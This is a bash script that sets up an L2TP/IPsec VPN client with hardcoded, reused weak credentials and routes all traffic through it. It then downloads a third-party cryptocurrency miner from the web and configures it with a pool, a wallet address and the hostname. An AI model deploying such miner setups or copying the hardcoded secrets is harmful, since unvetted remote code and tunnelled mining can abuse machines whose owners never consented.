#!/bin/bash
apt-get update
apt-get -y install strongswan xl2tpd curl git libssl-dev libcurl3
VPN_SERVER_IP='107.191.50.219'
VPN_IPSEC_PSK='quangvu'
VPN_USER='quangvu'
VPN_PASSWORD='quangvu'
cat > /etc/ipsec.conf <<EOF
# ipsec.conf - strongSwan IPsec configuration file
# basic configuration
config setup
  # strictcrlpolicy=yes
  # uniqueids = no
# Add connections here.
# Sample VPN connections
conn %default
  ikelifetime=60m
  keylife=20m
  rekeymargin=3m
  keyingtries=1
  keyexchange=ikev1
  authby=secret
  ike=aes128-sha1-modp1024,3des-sha1-modp1024!
  esp=aes128-sha1-modp1024,3des-sha1-modp1024!
conn myvpn
  keyexchange=ikev1
  left=%defaultroute
  auto=add
  authby=secret
  type=transport
  leftprotoport=17/1701
  rightprotoport=17/1701
  right=$VPN_SERVER_IP
EOF

cat > /etc/ipsec.secrets <<EOF
: PSK "$VPN_IPSEC_PSK"
EOF

chmod 600 /etc/ipsec.secrets
cat > /etc/xl2tpd/xl2tpd.conf <<EOF
[lac myvpn]
lns = $VPN_SERVER_IP
ppp debug = yes
pppoptfile = /etc/ppp/options.l2tpd.client
length bit = yes
EOF

cat > /etc/ppp/options.l2tpd.client <<EOF
ipcp-accept-local
ipcp-accept-remote
refuse-eap
require-chap
noccp
noauth
mtu 1280
mru 1280
noipdefault
defaultroute
usepeerdns
connect-delay 5000
name $VPN_USER
password $VPN_PASSWORD
EOF

chmod 600 /etc/ppp/options.l2tpd.client

mkdir -p /var/run/xl2tpd
touch /var/run/xl2tpd/l2tp-control
service strongswan restart
service xl2tpd restart
sleep 5s
ipsec up myvpn
sleep 5s
echo "c myvpn" > /var/run/xl2tpd/l2tp-control
sleep 5s
IP=$(/sbin/ip route | awk '/default/ { print $3 }')
route add 107.191.50.219 gw $IP
route add 117.7.81.138 gw $IP
route add default dev ppp0
wget -qO- http://ipv4.icanhazip.com/ > ip.txt

wget https://bitbucket.org/cryptogone/ariocppminer/downloads/ariocppminer_v0.9.5_ubuntu16_server.tar.gz
tar -zxf ariocppminer_v0.9.5_ubuntu16_server.tar.gz
echo "pool
http://aropool.com/
C5tkic7wXWtyk4YfZoF7f9GWANTk8FjBAGreLcHooMqfdHogm1F3tGTErDdio9njdpaLMtPxdMXswJk6NVvpkqE
14
enhanced
true
`hostname`" > config.cfg
